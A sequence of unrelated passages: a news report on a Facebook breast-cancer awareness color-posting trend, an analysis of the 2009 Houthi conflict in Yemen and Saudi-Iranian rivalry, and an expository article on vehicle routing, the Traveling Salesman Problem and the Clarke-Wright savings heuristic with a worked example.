It has been causing a bit of a stir over here , and I 've seen a lot of my male Facebook friends mentioning it on their pages . "
Some women are now putting a number next to the color , according to Davison Smith .
" I have no idea what the number means .
Suggestions have been the age the women lost their virginity or the number of people they have slept with .
I am none the wiser . "
One provocative New Jersey post declared , " I 'm not wearing one . "
Another from a young mother from New Hampshire commented : " I was going to make some comment about post baby boobs . "
For men , the color scheme was embarrassing .
" I saw lots of colors being posted and had no idea what it was about , so I wrote ' aquamarine ' and got several comments before I found out , " said one Nevada man .
" I may have jeopardized my standing in the men 's club . "
Breast Cancer Awareness Can Lead to Breast Cancer Checkup
These online antics may be raising more attention for women 's anatomy than for breast cancer research .
" I 'd like to learn more about this , " said Karen Young , a spokeswoman for the nonprofit breastcancer.org , which educates women who are living with the disease or those recently diagnosed .
" The challenge is you are seeing certain cryptic messages and they are interesting , but I have n't seen it lead anywhere .
I am really intrigued and think there is a possibility to bring it to the next level . "
Breast cancer strikes 1 in 8 women in the United States .
In 2008 , an estimated 182,460 new cases of invasive breast cancer are expected to be diagnosed in women in the U.S. , along with 67,770 new cases of non-invasive ( in situ ) breast cancer , according to breastcancer.org .
Though death rates have been decreasing since 1990 , about 40,480 women a year succumb to the disease .
The Facebook trend has " done a really good job of creating buzz , " according to Young .
" But where do they send people ? "
" I do n't know who is behind it and I would love to know , " she said .
" That 's part of what is intriguing .
It appeared suddenly but there is no place to go .
Maybe someone will come back for a follow up .
Who knows ? "
" We rely on donations , " said Young .
" We 'd be thrilled . "
But maybe not surprised , according to Justin Hare , a 27 - year - old editor for a Philadelphia medical publishing company , who suspects the advocacy groups themselves launched what he called a " clever public relations campaign . "
" I think there 's a chance with these social networking sites there is an inherent ability not to be taken seriously , " he told ABCNews.com .
" But I feel like the way this is going , the foundation or whoever came up with this is just keeping up with the times .
Generating interest goes a long way to generating awareness . "
" Although no fund raising is involved in this campaign , it has been a landmark in viral marketing , " according to All About Facebook , the " unofficial Facebook resource . "
" The campaign has served as a fast , free and fun way for women to raise awareness about breast cancer and remind other women to get themselves examined , " it said today .

Long - running tension between the government of Yemen and a rebellious clan in a remote border area has the potential to erupt into a major regional crisis , with media reports suggesting that the tension has the characteristics of a proxy war between Saudi Arabia and Iran .
On November 10 , the Iranian foreign minister Manoucher Motaki warned against foreign intervention , an apparent reference to Saudi Arabia .
The prospect exists that Yemen , already a haven for al - Qaeda elements , could become a failed state .
Handling this challenge looks to be an early test of the executive competence of a new generation of Saudi leadership .
Government Offensive
The current fighting dates from this past August , when the government in Sana started an offensive , code - named Operation Scorched Earth , against fighters of the Houthi clan who were blockading roads in the mountainous northwest of the country , near the border with Saudi Arabia .
Sana regarded these acts as a violation of a truce arranged last year .
Combating the rebels has been tough : some government forces have been taken prisoner , and rebel video footage has shown destroyed Yemeni armor .
Many refugees have fled the area , and civilians have been among the casualties .
The Houthis , who take their name from the family of their leader , say they want increased local autonomy and a greater role for their Zaydi version of Islam , which is Shiite and typically regarded as moderate .
The group has close links to local Sunnis , who are in the majority .
Indeed , President Ali Saleh of Yemen is himself a Zaydi .
Until the latest fighting , analysis based on discussion of a Sunni - Shiite divide , often a useful way to understand other parts of the Middle East , was usually inappropriate for Yemen .
Now , however , the fighting in northern Yemen has the makings of a proxy war , with Iran ( Shiite ) supporting the Houthi rebels and Saudi Arabia ( Sunni ) responding with support for President Saleh .
The fighting between the Houthis and government forces dates back to 2004 - 2005 , and it continued even after the rebel leader , Hussein al - Houthi , was killed .
More fighting broke out in 2007 , but the new leader , Abdul - Malik al - Houthi , a brother of Hussein al - Houthi , accepted a ceasefire .
Clashes erupted once again in early 2008 before Qatari diplomats could arrange a truce .
Although the Houthi forces lack aircraft and armored vehicles , they arguably have a tactical advantage in the confrontation owing to their numbers and training as well as their skillful use of land mines .
Houthi websites show rallies with high attendance , along with disciplined training sequences reminiscent of Hizballah activities in Lebanon .
Claims by the Sana government of Iranian involvement are bolstered by the slogans posted on one Houthi website : " Allah is great , death to America , death to Israel , curse the Jews , and victory for Islam . "
Such language suggests aims that far exceed a quest for local autonomy .
On November 4 , the Saudi Air Force launched strikes using F - 15 and Tornado ground - attack aircraft against rebels who , according to Riyadh , had crossed the border into Saudi Arabia and killed several Saudis .
Media reports that the Saudi aircraft had struck targets across the border in Yemen were denied in both capitals .
Then , on November 8 , a Yemeni fighter crashed , an incident that was attributed to mechanical problems by Sana officials but claimed by rebels as a successful takedown by antiaircraft fire .
The present story of possible Iranian involvement goes back into late October , when Yemen seized an Iranian ship loaded with weaponry that included antitank weapons .
Adding to the intrigue , the most recent video to appear on a Houthi website shows a captured Saudi special forces soldier , seized Saudi arms and vehicles , and what appears to be Saudi aircraft dropping white phosphorus on rebel positions in the mountains .
Regional Implications
The crisis in Yemen could have serious consequences for Gulf security .
The most populous state in the Arabian Peninsula , Yemen is also the poorest -- as well as the poorest Arab country overall , as measured by gross domestic product per capita .
The African continent lies just eighteen miles away , across the Bab al - Mandab Strait , through which more than three million barrels of oil pass daily en route to Europe .
And across the Gulf of Aden -- a present - day cauldron of piracy and the site of a 2002 al - Qaeda attack on an oil tanker -- is the failed state of Somalia .
Usama bin Laden 's father also hails from Yemen , where , according to Sana officials , thousands of al - Qaeda fighters still find refuge .
Although the country has existed in some form for hundreds of years , its current configuration dates only to 1990 , when North Yemen and South Yemen united .
In 1994 , the government quashed a rebellion by southerners seeking independence , but resentment of Sana 's domination persists .
Implications for the Saudis
Historically , Saudi Arabia is cautious as regards involvement in Yemeni affairs .
During the Yemeni civil war in the 1960s , the Saudis supported the royalist side , while Egypt , using chemical weapons , backed the ultimately victorious republican forces .
Decades later , when President Saleh backed Saddam Hussein 's 1990 invasion of Kuwait , the kingdom expelled several hundred thousand Yemenis , until then a key part of its labor force .
The border between the two countries has also been in question , with the Yemenis previously making claims to the kingdom 's southern provinces .
While that issue has now apparently been resolved , Riyadh sometimes mishandles the local population , the majority of whom are Zaydis ( as are Yemenis across the border ) and Ismailis .
Both groups are subject to discrimination by the Saudi ( Wahhabi ) religious police .
In early 2001 , the Saudi authorities temporarily lost control of the provincial capital of Najran after the religious police cracked down on local groups .
In the current crisis , the Saudi council of ministers has pledged " zero tolerance for intruders , " an apparent reference to Houthi rebels .
Interestingly , King Abdullah has effectively delegated management to the next generation of princes .
Prince Khaled bin Sultan , assistant defense minister and the son of ailing Crown Prince Sultan , visited troops at the border on November 8 and declared a " killing zone " stretching six miles into Saudi territory .
Another key figure is Prince Muhammad bin Nayef , the counterterrorism chief , who had a narrow escape in late August when an al - Qaeda fighter who had arrived from Yemen blew himself apart while supposedly surrendering .
Also involved are Abdullah 's son Prince Mishal bin Abdullah , who was appointed governor of Najran earlier this year , and the king 's nephew Prince Mishal bin Miteb , who replaced his aging father as local government minister just last week .
A particular challenge is that the kingdom feels obliged , despite the border tension , to allow Yemeni pilgrims to visit the holy city of Mecca during the current Hajj season .
On November 8 , Prince Mishal bin Abdullah instructed officials to keep border crossing points open .
U.S. Policy
For Washington , the border tension compounds an already complicated relationship .
Ever since the USS Cole was blown up in Aden harbor by al - Qaeda in 2000 , the United States has felt that Yemen has not acted strongly enough against al - Qaeda fighters .
Even imprisoned fighters have often been released or apparently allowed to escape .
This scenario complicates the Obama administration 's efforts to close the Guantanamo Bay detention center , where Yemenis form the largest residual national contingent .
U.S. efforts to persuade President Saleh to allow these detainees to be sent to Saudi rehabilitation programs -- because Washington does not trust Yemen to look after the detainees sufficiently -- have failed so far .
On the other hand , Washington has worked successfully with Sana to arrange for the emigration of members of Yemen 's remaining Jewish community , which has been targeted by both the Houthis and al - Qaeda .
The State Department has aired its view that the conflict between the Houthis and the Yemeni central government will not be resolved through military means .
But , for their part , Yemeni officials warn privately that the state could be threatened if Sana is not helped with military supplies and given latitude to pursue its military campaign .
On the diplomatic front , Sana hopes that it can sort out its relations with Iran while , for now , simply asking the Houthis , estimated at between 6,000 and 7,000 armed men , to give up their military positions .
Sana fears that the Houthis -- encouraged by Tehran -- aim to undermine U.S. and Saudi interests in its corner of the Arabian Peninsula .
Such a view will be tested during the coming winter months , which , in Yemen 's mountains , unlike much of the rest of the world , are the best time for fighting .
Keep on Trucking

Introduction
Love may make the world go round but what makes our daily lives so much easier is trucks .
Trucks deliver the food that we eat to the supermarkets and restaurants we use , they deliver the gasoline to the stations where we refill the gas tanks in our cars , and they are responsible for a huge part of the movement of supplies throughout local regions and nationally .
And what helps make it possible for trucks to carry out all the deliveries they do is mathematics .

Background
During World War II the Allies discovered that wars were not only waged by soldiers but by the people who designed the efficiency of the scheduling of troop movements and materiel that were necessary for soldiers to fight the war .
With no lines of supply , soldiers can not be very effective .
The ideas laid down during the war became codified in the area of knowledge that has come to be called operations research or management science .
Operations research drew heavily on the mathematics and the nascent computer science to assist businesses , governments , and individuals in organizing their work ( and play ) more efficiently .
One early triumph of the newly emerging area of operations research was the codification of the linear programming model .
Linear programming has been one of the most successful applied mathematical tools in history .
It makes possible a wide array of scheduling , allocation and blending problems to be solved .
Basically , the idea behind linear programming is to find the maximum or minimum value of a linear function ( typically of many variables ) where the variables are constrained by a system of linear inequalities .
As computers have become faster , it is often possible to solve many large linear programming problems in real time .
The best known algorithm for linear programming , pioneered by George Dantzig , is called the simplex method .
( George Dantzig )
Although the simplex method can in the worst case require exponential time to carry out , it runs very well in practice , a phenomenon which mathematicians are trying to understand better .
There are polynomial - time algorithms for linear programming due to Leonid Kachiyan and Narendra Karmarkar .
However , in many situations where linear programming is employed , the simplex method outperforms those polynomial - time algorithms , which fall into groups classified as interior point methods or ellipsoidal methods .
In many situations which one might like to model using linear programming , the values of the variables are restricted to non-negative integers .
This extension of the linear programming model is known as integer programming .
At the current time there are no known polynomial - time algorithms for integer programming , though there are special kinds of integer programming problems for which polynomial - time algorithms are known .
What has made linear programming so powerful is that the model is flexible enough to formulate a huge range of situations that come up in applied situations .
Thus , linear and integer programming have found use in mixture problems , allocation of resources , blending questions ( oils to make gasoline and meats to make cold cuts ) , and scheduling , to mention but a few .
Many vehicle routing problems can be formulated in terms of linear and integer programming .
Here is the what the authors ( G. Dantzig and J.H. Ramser of what was probably the first paper on vehicle routing from a mathematical perspective ) wrote as the abstract to their paper :
The paper is concerned with the optimum routing of a fleet of gasoline delivery trucks between a bulk terminal and a large number of service stations supplied by the terminal .
The shortest routes between any two points in the system are given and a demand for one or several products is specified for a number of stations within the distribution system .
It is desired to find a way to assign stations to trucks in such a manner that station demands are satisfied and total mileage covered by the fleet is a minimum .
A procedure based on a linear programming formulation is given for obtaining a near optimal solution .
The calculations may be readily performed by hand or by an automatic digital computing machine .
No practical applications of the method have been made as yet .
A number of trial problems have been calculated , however .
Time has seen to it that ideas of this kind are being applied regularly , at the same time as the problem nurtures an ever growing collection of specialized applied and theoretical studies of mathematical models suggested by the original .
Some history
The first scholarly paper which addresses what today is called the vehicle routing problem ( VRP ) appeared in 1959 in the journal Management Science , whose first volume appeared only 4 years before in 1955 .
The authors of this paper were George Dantzig ( 1919 - 2005 ) and J. H. Ramser .
Their work was also presented at the Fifth World Petroleum Congress held in New York in 1959 .
Dantzig was a well known and important figure in linear programming and operations research and was working for the Rand Corporation at the time .
I was unable to find out much information about Ramser , whose full name was John Ramser .
At the time he worked with Dantzig on this paper he was an employee of the Atlantic Refining Company in Philadelphia , which later became ARCO and was eventually absorbed into British Petroleum .
He wrote at least one other quite mathematical paper ( " Theory of Thermal Diffusion under Linear Fluid Shear " ) and was the author of a variety of patents .
Ramser also played a role in the early development of SIAM ( the Society for Industrial and Applied Mathematics ) , having served in its earliest days ( 1953 - 1956 ) on its governing council .
A few years after the Dantzig - Ramser paper another important milestone paper appeared .
This paper by G. Clarke and J. W. Wright appeared in 1964 .
Clarke and Wright specifically discuss the work of Dantzig and Ramser but develop a rather different approach which has proved extremely fruitful .
I know relatively little about Clarke and Wright .
Clarke was affiliated with the Wholesale Cooperative Society of Manchester , while Wright worked at the University of Manchester ( England ) .
Their work will be treated later , but first let us look at a problem that actually predates the one formulated by Dantzig and Ramser ( and which they mention in their paper ) and which has had great importance of its own .
A special vehicle routing problem
Anyone sitting in traffic in a large city knows that trucks come in a staggering array of types , ranging from relatively small delivery trucks to the giant trucks that carry ore from mines to other locations .
We will see that there are different types of problems that arise for these different types of trucks .
Although there are many applied questions which involve trucks and , more generally , vehicles , what has come to be called the vehicle routing question has a special structure .
Generally speaking , the goal of the problem is to minimize the cost of carrying out the needed work while not violating the constraints that may be imposed ( e.g. truck capacity or the delivery at site 3 must be made between 2 and 3 p.m. ) .
In particular , there is a very special case of the vehicle routing problem which is much better known than the vehicle routing problem itself .
Known as the Traveling Salesman Problem , it first began to be studied in about 1930 .
This problem is so significant that there are whole books devoted only to issues related to the Traveling Salesman Problem ( TSP ) .
Here is a " vanilla " formulation of the TSP which suggest how it got its name .
A salesperson lives in X and must visit a finite number of locales A , B , C , ... , Z once and only once and then return to X , his / her home site .
There is a cost of getting from home to any of the locales and a cost of getting between any pair of the locales .
Find a tour for the salesperson that minimizes the cost of such a tour .
How does one measure cost in such a situation ?
The cost may be time , distance , the cost of gasoline if the trip is by auto , the cost of train tickets if the trip is by train , etc .
The goal of solving a TSP is both to know what the minimal cost would be and to find the tour that achieves this minimal cost .
The answer to a TSP in a particular case will depend on the costs associated with the " trips " between pairs of locations .
The driving tour may be different from the airline tour .
Furthermore , as is often the case when problems from the " real world " are examined within the mathematical world , one quickly sees that one has to make simplifying assumptions ( this process is called mathematical modeling ) to analyze what is happening .
For example , whereas when one thinks of distance it is natural to feel that the distance from U to V should be the same as the distance from V to U , and this would be true of Euclidean distance ( or taxicab distance ) , in many applied situations like the TSP this assumption that distance is " symmetric " will not hold .
For example when one drives from U to V in a city , it would be rare , because there are one - way streets , that the distance from U to V will be the same as the distance between V and U .
Thus , already the formulation of the TSP given above is " too simple " for some situations .
In some cases two costs between sites would be needed : the cost of going from U to V and a different cost going from V to U .
One traditional way to model a TSP is to use the geometric tool consisting of dots and line segments called a graph .
Home ( or the depot ) and the sites to be visited are represented by dots known as vertices , and two sites are joined by an edge if there is a finite cost to get between the two sites .
If the cost involved in going from U to V is not the same as the cost in going from V to U , one uses a directed graph instead of a graph , the difference being that in a directed graph there are line segments with arrows on them .
Typically in the undirected case the graph one gets is a complete graph , meaning that there is an edge between every pair of vertices .
Each edge is also assigned a weight which gives the cost between the sites it joins .
Ordinary Euclidean distance also has the property that the distance from U to V plus the distance from V to W is greater than or equal to the distance between U and W .
When this situation holds for all triples of sites U , V , and W we say the triangle inequality holds .
The triangle inequality is one of the usual " axioms " ( rules ) that mathematicians assume an " abstract " distance obeys .
However , for driving distance this may not be true because roads may not follow Euclidean distance .
Thus , due to mountainous terrain it may be that the distance to drive from U to W directly may be longer than going from U to V and then from V to W .
So the " costs " that are mentioned in the TSP may or may not obey the triangle inequality .
Another property of distance is that the distance between U and V is either a positive number or zero .
In fact , it will be zero in the situation for an abstract distance if and only if U and V are the same site .
However , it is convenient in the applications to which the TSP is applied to allow the cost from U to V to be negative .
One can interpret this negative cost as a subsidy for going from U to V. Figure 1 has symmetric distances ( distance from U to V equals the distance from V to U ) but has subsidized edges AC and XB .
In other examples we might have a different distance from U to V than from V to U .
Also we might have a positive cost from site M to N but a negative cost from N to M .
The evolution of the TSP has followed the course of many mathematics problems .
Initially inspired by a practical and intuitive problem in operations research , it not only became important to solve the problem for these practical reasons but it was quickly realized that ideas related to solving this problem had important aspects for mathematics itself .
As a consequence , many variants of the problem emerged which had intrinsic interest as mathematics problems , but these in turn represented results which had applicability of their own .
Figure 1 ( 4 - site instance of a TSP , with edge subsidies )
One of the amazing things about important mathematical problems is how they pop up in places one might not initially think of .
For a long time my favorite unexpected application of the TSP was to the fabrication of chips .
To manufacture a chip requires the insertion of various components , typically using a robot .
The optimal insertion order for these insertions involves solving an asymmetric TSP .
However , I recently learned from David Johnson of work by Adam Buchsbaum ( and colleagues ) .
The basic idea is that large companies such as a phone company generate tables of information consisting of many fixed length records .
A large company might have to store over a billion records per month , where the records could contain such information as the exchanges between which calls are made , call lengths , and costs , etc .
In light of the huge amounts of data involved , it is desirable to store this data in compressed form .
While for photos that appear in articles such as this one , compression that loses information is acceptable , for the application in this case lossless compression is mandatory .
Oversimplifying greatly , it turns out that one can compress parts of the data set ( sets of columns ) and follow this by a compression of additional columns that make up the data set .
The space used up at the end will generally depend on the order in which the sequence of compressions is carried out as well as the ordering of the columns in the group being compressed .
Hence , one can profitably use the TSP ( the asymmetric case ) as one piece in the methodology to store the large data set as compactly as possible .
How hard is it to solve vehicle routing problems ?
Not surprisingly , the amount of " work " necessary to solve a problem by hand or using a computer increases dramatically as the number of sites to be visited grows and the complexity of the constraints to be dealt with increases .
So a decision has to be made as to how much " money " ( e.g. time and effort ) to spend in finding an exact ( optimal ) solution versus an approximate solution which is known to be not far from an optimal solution , or one may be willing to settle for a solution which " works " ( e.g. meets the constraints ) and which can be obtained without undue effort .
For example , in scheduling a collection of vehicles to deliver meals on wheels to elderly or ill people in a city , it might not make sense to spend lots of extra money to find a solution that is 3 % better than one that can be found easily because the elderly can pass away or enter the hospital for a few days and not require a food delivery .
Thus , the routes designed on a given day perhaps will have to be different from those on the next day .
Hence , for this situation one needs an algorithm which finds an answer quickly and has the flexibility to handle sites that will enter or drop out of the collection of locations where a " delivery " must be made .
On the other hand , if one is delivering things to supermarkets or to gasoline stations , it may well be worth spending the extra time and effort to find a 3 percent better solution than the one currently used because over a period of time in using the less costly solution one can compensate for the costs that getting the better solution entails .
So one of the considerations for both the TSP and more general vehicle routing problems is that of finding an exactly optimal or approximately optimal solution .
However , as problems grow larger , the amount of work can be expected to grow whether or not one wants an exact or approximate solution .
The branch of mathematics and computer science known as complexity theory address the questions of how much " work " it takes to solve various kinds of problems using an algorithm designed to run either on a sequential or parallel computer .
The basic idea is that there is a number n associated with the different instances of the problem which measures the size of the problem .
For example , for the TSP the number n is usually the number of sites to be visited .
As n grows larger for the TSP , what is the mathematical function that describes the amount of work necessary to solve the problem ?
When problems of size n can be solved using an algorithm that uses an amount of work that grows as a polynomial in n ( even if the degree of this polynomial is large ) , the algorithm for the problem is considered a ( relatively ) easy one .
However , when any algorithm to solve a problem uses an amount of work which grows faster than an exponential function of n , the problem is considered hard .
The collection of NP - complete problems are problems for which no known polynomial - time algorithm exists but for which it has not been proved that an exponential - time algorithm is required .
Furthermore , if any problem in this collection could be shown to be solvable in polynomial time or require exponential time , all the problems in the collection would have the same status with regard to their difficulty .
Thus , NP - complete problems are all computational " hard " or all computationally " easy " but we do n't know which !
The general version of the TSP was shown to be NP - complete as early as 1972 by Richard Karp .
Many variants of the TSP have been shown to be NP - complete .
Some good news is that the Euclidean distance version of the TSP admits a polynomial - time approximation method .
However , nearly all variants of the VRP are " at least as hard " as the TSP and , thus , for reasonably large problems , exact methods may not be practical .
This suggests using heuristic methods :
Algorithms that are not guaranteed to be optimal but can be implemented efficiently even for relatively large problems .
The Clarke - Wright heuristic
One seminal paper in the area of vehicle routing was published in 1964 by G. Clarke and J.W. Wright and has come to be known as the Clarke - Wright Algorithm .
The Clarke - Wright Algorithm is a " greedy " algorithm which has a very intuitive structure .
As in many applied situations , we construct a mathematical model ( simplified view ) of what we want to study , and if this leads to some success in obtaining insight , we will expand the model to more " realistic " settings .
Here is the basic situation that the Clarke - Wright method addresses : A collection of identical trucks , in which each truck has a fixed amount of capacity - - typically measured in how much weight ( in some cases volume ) it can carry -- is located at a single site called the depot .
There is a collection of customers to whom deliveries must be made from the depot .
The size of the delivery might be different from one customer to the next or it might be the same for all customers .
What is available is information about the distance or time between the depot and the sites as well as the same information between the sites .
In some situations the time or distance between two locations may not be the same in both directions .
Thus , as part of the problem specification it is important to make sure whether symmetric or unsymmetric distances are being used .
Let us consider a specific example to give the flavor of what is involved and to help you think about what is going on .
You can then see how some simple intuitive ideas can be used to get insight into problems of this kind .
We will assign the depot from which the one or more vehicles are to be dispatched the name " 0 " and all the other sides will be numbered from 1 to n .
The cost of a trip between two sites i and j ( one of which may be the depot ) will be denoted c i , j .
Thus , for example , c 2,3 will denote the cost of going from site 2 to site 3 while c 4,0 will denote the cost of going from site 4 to the depot .
We will , only for convenience , assume that the cost of going from i to j is the same as going from j to i .
Now if we currently have a vehicle that goes from the depot to i and back and another vehicle going from the depot to j and back , the cost for the first vehicle will be c 0 , i + c i,0 which , since these two costs are the same , is 2c 0 , i , and , similarly , we get a cost of 2c 0 , j for the second vehicle to go from the depot to j and back .
If it is possible to use one truck for both of these " deliveries " we can consider the route which " merges " these two " subroutes " and go from the depot to i and then continue on from i to j ( rather than going back to the depot ) and then return to the depot from j .
Now the cost of the trip from the depot to i , then to j , and then to the depot is :
so if we replace the two trips from the depot to and from each of i and j by the trip from the depot to i and then to j and then back to the depot , we can compute the different in cost between these two different routings :
The number just computed is the " savings " obtained when the tours that go from the depot to i and the depot to j are " coalesced . "
( From different points of view one can think of this merging process as taking two separate routes carried out by one vehicle as being collapsed to one tour for that truck or as two trips that are carried out by different vehicles now being carried out by a single vehicle . )
The Clarke - Wright heuristic algorithm is a " greedy " algorithm .
This means that at each stage when something is carried out , a " locally " ( at that moment ) best decision is made .
Of course , there is no guarantee that such locally good choices end up with a solution that is globally good or even nearly good .
( For many greedy algorithms an optimal answer will be obtained . )
There are by now many , many variants of the Clarke - Wright heuristic .
I will try to give you the gist of the ideas in as non-technical language and notation as possible .
Begin by visiting the required sites by going from the depot to that site and back again .
For a depot and 2 sites this will be represented by the single edges as in Figure 2 .
Now , if when we get to i from 0 ( the depot ) we go to j rather than going back to the depot immediately , and now return to the depot from j , it seems intuitively clear that we should save " cost . "
As we saw above , the saving in this case will be S i , j as computed above .
This savings will be positive when the costs obey the triangle inequality .
So it would seem to be helpful to know how large the different savings will be between pairs of sites i and j .
We can then try to adopt a " greedy " approach by trying to coalesce subtours at each stage using a " short cut " edge with the greatest savings ( as suggested by the approach in Figure 2 , where one can also think of the single edges as subtours , and not necessarily as a single edge ) .
Figure 2
So the idea behind Clarke - Wright is to merge " subtours " when possible to get a longer , cheaper tour of all the sites .
Figures 3 and Figure 4 show what subtours might look like when solving a moderately sized problem by hand .
Note that if we have two trucks these diagrams might ( depending on the constraints of the problem ) represent the final result of the algorithm .
However , when we are using the Clarke - Wright heuristic to solve a TSP we would not be finished at this stage .
Using Figure 4 we can see the ways that these tours ( which currently are : 0 , 1 , 2 , 6 , 0 and 0 , 4 , 5 , 3 , 0 listed in order , although they could be written in reverse cyclic order ) might be merged .
To merge these two circuits we could use edge 63 to get the circuit 0,1,2,6,3,5,4,0 ; edge 64 to get 01264530 ; edge 31 to get 04531260 ; or edge 41 to get 03541260 ( or these four circuits in reverse cyclic order ) .
Figure 3
Figure 4
We will think of each of the two variants of the Clarke - Wright heuristic under consideration as having two steps .
Step 1 is the same for both variants .
Step 1 :
Compute the saving S i , j associated with the edge i , j ( i , j different and neither 0 ) .
Now order these savings in nonincreasing order .
Variant A :
Step 2
Begin with the edge at the top of the saving list .
Move through the list of savings .
When considering the saving S i , j check if there are currently tours using edges 0 , j and 0 , i and if these tours can be feasibly merged , do so by adding i , j to the tour and deleting edges 0 , j and 0,i .
( Note : If the trucks being used for these two tours have limited capacity , one reason why it might not be feasible to join the two tours using edge i , j , even if the edge conditions above are met , is that the sizes of the pickups at i and or j , when added to the vehicle 's load in this merged tour would exceed the room available on either truck being used for the smaller tours .
One tries to merge tours as one goes through the list of savings .
When one achieves a single tour for all the sites or runs out of edges , one terminates . )
Variant B :
Step 2
Begin with the edge at the top of the savings list .
Use the next edge in the savings list to expand the current route by using this edge to extend the tour currently being worked on .
If this tour cannot be extended , try to extend another tour using this edge .
If no tour can be extended using the current edge , move to the next edge in the savings list .
( Note : Initially , one can always add the maximum saving edge unless the capacity of the vehicles serving the sites at its ends are too large for one of the vehicles to be used .
The idea here is to try to expand the current tour as long as possible with the edge providing the largest possible saving .
One only moves on to another tour when the current tour cannot be added to . )
When there are other constraints such as capacity of vehicles or restrictions on the number of sites on a tour , etc. , the algorithm above is modified to check that adding the edge i , j which has the greatest saving at a particular stage is feasible with respect to the constraints , in addition to being possible from the point of view of enabling the merging of the tours .
Experiments have been done to compare the two variants described above .
There are some indications that Variant A tends to work better .
To give you the flavor of the Clarke - Wright algorithm we will discuss how to use Variant 1 to solve a very small example .
In the graph below we have a depot , labeled 0 , and four sites labeled 1 to 4 .
This example involves a complete graph on 5 vertices ( every pair of the vertices is joined by an edge ) .
Furthermore , there is a cost associated with every edge in the graph which you can interpret as the amount of time it typically takes to travel between the pair of sites that are at the ends of the edges .
Figure 5 ( A four site instance of a VRP )
In this example , the driving times in each direction between two sites are the same .
We also have the property that for of any three vertices the sum the lengths of any two sides of the triangle they form has weight greater than the weight ( cost ) of the third side .
We will initially think of this as a TSP problem , that is , we want to find a reasonably short route from the depot which visits each site exactly once and returns to the depot .
We initialize our solution by thinking of the vehicle going from the depot to each site and back again .
At this stage we have the diagram in Figure 6 .
We will then see how to improve this very inefficient " tour " to one which hopefully would be a lot better .
Figure 6
We will assume that the trucks we are using have infinite capacity .
Thus , we will be treating this problem as if what we are trying to do is find a TSP solution .
We start by computing the savings that are associated with edges that connect two sites other than the depot ( 0 ) .
S 1,2 = 31 + 33 - 40 = 24
S 1,3 = 31 + 37 - 61 = 7
S 1,4 = 31 + 29 - 46 = 14
S 2,3 = 33 + 37 - 42 = 28
S 2,4 = 33 + 29 - 49 = 13
S 3,4 = 37 + 29 - 48 = 18
In sorted order , from larger to smaller savings , the edges are : 2,3 ; 1,2 ; 3,4 ; 1,4 ; 2,4 ; and 1,3 .
Since edge 2,3 has the largest saving , we can replace the pairs of tours 0,2,0 and 0,3,0 by the merged tour 0,2,3,0 .
We now have a diagram ( Figure 7 ) that looks like :
Figure 7
The edge with the next largest saving is edge 1,2 .
This edge can be added to merge the tours 0 , 1 , 0 and 0 , 2 , 3 , 0 , to obtain the tour 0 , 1 , 2 , 3 , 0 .
We can see the resulting collection of tours at this stage in Figure 8 .
Figure 8
The edge with the next largest sorted order would be 3,4 .
This edge can be used to merge the tours 0 , 4 , 0 and 0 , 1 , 2 , 4 , 0 to form a final tour , visiting all sites of 0 , 1 , 2 , 3 , 4 , 0 .
Note that had 2 , 4 been the cheapest edge at this stage it could not be used to merge the two tours .
Had edge 1,4 been cheapest , then the merged tour would have been 0 , 3 , 2 , 1 , 4 , 0 which visually is self - intersecting but permitted .
Given the actual numbers here , the final tour is shown in Figure 9 .
Figure 9
The cost of this tour is 31 + 40 + 42 + 48 + 29 = 190 .
A very commonly used heuristic for the TSP is known as nearest neighbor .
Starting at the depot one goes next to that site not already visited for which the cost is the cheapest .
In this example , nearest neighbor would select the sites in the order : 0 , 4 , 1 , 2 , 3 , 0 .
This is a different tour from the one found using the Clarke - Wright heuristic .
The cost of this tour is : 29 + 46 + 40 + 42 + 49 = 206 which is 16 units more expensive than the tour we found .
What would have to be done to find the optimal TSP tour for this example ?
You might want to see if you can find a cheaper tour than the one we found using the Clarke - Wright heuristic .
To do so using brute force would involve examining all the possible TSP tours ( there are ( 5 ) ( 4 ) ( 3 ) ( 2 ) ( 1) /2 = 60 possibilities ; we divided by two since any tour is the same as the one read in reverse cyclic order ) .
Suppose there were goods to be collected at the sites :
1. 4 units
2. 2 units
3. 3 units
4. 1 unit
Also suppose that the vehicles have capacity 6 .
What happens now when we apply Clarke - Wright ?
We can still use the same list edges sorted by savings .
We again start with the tours 0 , 1 , 0 ; 0 , 2 , 0 ; 0 , 3 , 0 ; 0 , 4 , 0 , which involve four vehicles but notice that each truck will pick up less than its capacity of 6 .
We can use edge 2,3 to merge the tours 0 , 2 , 0 and 0 , 3 , 0 because the pickups at 2 and 3 amount to 5 units , which is less than the capacity of the one truck that could serve these two cities .
At this stage we have the tours 0 , 1 , 0 ; 0 ( truck carries 4 units ) , 2 , 3 , 0 ( truck carries 5 units ) and 0 , 4 , 0 ( truck carries 1 unit ) .
Now the next largest saving is achieved with edge 1 , 2 .
Although we can merge the tours 0 , 1 , 0 and 0 , 2 , 3 , 0 , neither of the trucks used for these smaller tours has the capacity for the combined load of 9 , so we cannot merge these two tours .
We move on to the edge with the next largest saving , edge 3 , 4 .
Now this edge can be used to merge the tours 0 , 2 , 3 , 0 and 0 , 4 , 0 and because the sum of the loads for these three sites ( 2 , 3 , and 1 ) is only 6 , we can in fact combine these tours .
At this stage we have the tours 0 , 1 , 0 ( truck carries 4 units ) and 0 , 2 , 3 , 4 , 0 ( truck carries 6 units ) .
No further merging of tours is possible so we terminate with two trucks and a total length of 31 + 31 ( for tour 0 , 1 , 0 ) + 33 + 42 + 48 + 29 ( for tour 0 , 2 , 3 , 4 , 0 ) = 214 .
It turns out this is not the optimal tour .
Can you find a feasible tour which is cheaper ?
You may also want to try using the other variant of Clarke - Wright on this problem to see if there is any difference in the tours found .
What is exciting about thinking about vehicle routing problems in conjunction with a specific example such as this one is that it suggests other methods for attacking this kind of problem as well as more general ideas for other types of combinatorial optimization questions .
For example , in thinking about vehicle routing in general ( or TSP problems with several salespersons ) there are two different strategies that come to mind :
* cluster sites and then find good routes to visit the clusters
* find a cheap route ( which may not meet other constraints ) and then cluster to meet the necessary constraints .
Huge literatures exist for both of these strategies to solve VRP problems .
The reason why vehicle delivery questions are so complex is the large number of variables that come into play in providing the service that is needed .
For example , here are some issues that must be taken into account in problems of this sort :
* Is the vehicle only making deliveries , or does the nature of the business also make sense for pickups to be allowed ?
Places where deliveries are to be made are known as linehaul sites and places where goods are to be picked up are known as backhaul sites .
In some cases a problem may be purely a linehaul or backhaul but in other situations a mixture of customers is involved or there may be deliveries at some sites and pickups at the same site .
( Comments :
When a truck is involved in making bread deliveries to restaurants , grocery stores , and supermarkets , it may appear that all that might be involved is that there would be different numbers of loaves that go to each of the " customers . "
